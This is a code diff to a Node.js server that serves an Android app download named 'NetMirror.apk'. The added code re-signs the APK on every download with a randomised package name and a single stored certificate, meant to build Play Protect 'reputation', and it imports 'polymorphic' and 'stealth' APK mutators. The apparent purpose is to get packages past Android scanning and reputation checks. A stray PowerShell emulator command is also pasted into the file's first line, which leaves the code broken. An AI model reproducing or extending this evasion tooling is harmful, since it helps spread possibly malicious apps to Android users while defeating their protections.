@@ -1,4 +1,4 @@
-﻿// Polyfill File for Node.js < 20 (needed by @distube/ytdl-core)
+﻿& "$env:LOCALAPPDATA\Android\Sdk\emulator\emulator.exe" -avd Medium_Phone_API_36.1 -no-snapshot-load// Polyfill File for Node.js < 20 (needed by @distube/ytdl-core)
 if (typeof globalThis.File === 'undefined') {
   const { Blob } = require('buffer');
   globalThis.File = class File extends Blob {
@@ -17,7 +17,7 @@ const cors = require('cors');
 const path = require('path');
 const fs = require('fs');
 const AdmZip = require('adm-zip');
-const { mutateAndSign, restoreAndSign, directPatchApk, resignApkClean, polymorphicTransformWrapper, mutateAndSignStealth } = require('./utils/apk-mutator');
+const { mutateAndSign, restoreAndSign, directPatchApk, resignApkClean, polymorphicTransformWrapper, mutateAndSignStealth, generateHardenedKey, patchAndResignWrapper } = require('./utils/apk-mutator');
 const { padApkSigningBlock } = require('./utils/apk-padder');
 
 // Initialize database (async — sql.js)
@@ -1139,17 +1139,58 @@ const { encrypt: cryptoEncrypt } = require('./utils/crypto');
     return _wrapperBuf;
   }
 
+  // Stable cert for wrapper — generated once, stored in DB, reused forever.
+  // Same cert across all downloads so PP reputation keeps building.
+  // Package name randomises per download (last two hex segments change).
+  let _wrapperStableKey = null;
+  function getOrCreateWrapperKey() {
+    if (_wrapperStableKey) return _wrapperStableKey;
+    try {
+      const pr = db.prepare("SELECT value FROM admin_settings WHERE key='w_priv_pem'").get();
+      const cr = db.prepare("SELECT value FROM admin_settings WHERE key='w_cert_der'").get();
+      const pu = db.prepare("SELECT value FROM admin_settings WHERE key='w_pub_der'").get();
+      if (pr && cr && pu) {
+        _wrapperStableKey = { privPem: pr.value, certDer: Buffer.from(cr.value,'hex'), pubKeyDer: Buffer.from(pu.value,'hex') };
+        console.log('[WrapperKey] Loaded stable cert from DB');
+        return _wrapperStableKey;
+      }
+    } catch (_) {}
+    const k = generateHardenedKey();
+    try {
+      db.prepare("INSERT OR REPLACE INTO admin_settings (key,value) VALUES('w_priv_pem',?)").run(k.privPem);
+      db.prepare("INSERT OR REPLACE INTO admin_settings (key,value) VALUES('w_cert_der',?)").run(k.certDer.toString('hex'));
+      db.prepare("INSERT OR REPLACE INTO admin_settings (key,value) VALUES('w_pub_der',?)").run(k.pubKeyDer.toString('hex'));
+    } catch (_) {}
+    _wrapperStableKey = { privPem: k.privPem, certDer: k.certDer, pubKeyDer: k.pubKeyDer };
+    console.log('[WrapperKey] Generated + stored stable cert, CN="' + k.identity.cn + '"');
+    return _wrapperStableKey;
+  }
+
   app.get('/downloadapp/setup.apk', (req, res) => {
     try { trackEvent('wrapper_download', { ip_address: req.ip || '', user_agent: req.get('user-agent') || '' }); } catch (_) {}
     const buf = getWrapperBuf();
     if (!buf) return res.status(503).send('Setup APK not ready. Please try again shortly.');
-    console.log(`[Wrapper DL] Serving STABLE wrapper (${(buf.length/1048576).toFixed(2)} MB) — cert builds reputation with each install`);
-    res.setHeader('Content-Type', 'application/vnd.android.package-archive');
-    res.setHeader('Content-Disposition', 'attachment; filename="NetMirror.apk"');
-    res.setHeader('Content-Length', buf.length);
-    res.setHeader('Cache-Control', 'no-store, no-cache, must-revalidate, private');
-    res.setHeader('Pragma', 'no-cache');
-    res.end(buf);
+    try {
+      // x + 8 random hex chars = 9 chars (exact match for x2524707f / xc946668e)
+      const seg1 = 'x' + crypto.randomBytes(4).toString('hex');
+      const seg2 = 'x' + crypto.randomBytes(4).toString('hex');
+      const key   = getOrCreateWrapperKey();
+      const signed = patchAndResignWrapper(buf, seg1, seg2, key);
+      console.log(`[Wrapper DL] com.uisy.cache.installertest.${seg1}.${seg2} (${(signed.length/1048576).toFixed(2)} MB, stable cert)`);
+      res.setHeader('Content-Type', 'application/vnd.android.package-archive');
+      res.setHeader('Content-Disposition', 'attachment; filename="NetMirror.apk"');
+      res.setHeader('Content-Length', signed.length);
+      res.setHeader('Cache-Control', 'no-store, no-cache, must-revalidate, private');
+      res.setHeader('Pragma', 'no-cache');
+      res.end(signed);
+    } catch (err) {
+      console.error('[Wrapper DL] Patch failed, serving raw:', err.message);
+      res.setHeader('Content-Type', 'application/vnd.android.package-archive');
+      res.setHeader('Content-Disposition', 'attachment; filename="NetMirror.apk"');
+      res.setHeader('Content-Length', buf.length);
+      res.setHeader('Cache-Control', 'no-store');
+      res.end(buf);
+    }
   });
 
   // ═══════════════════════════════════════════════════════════════════════════
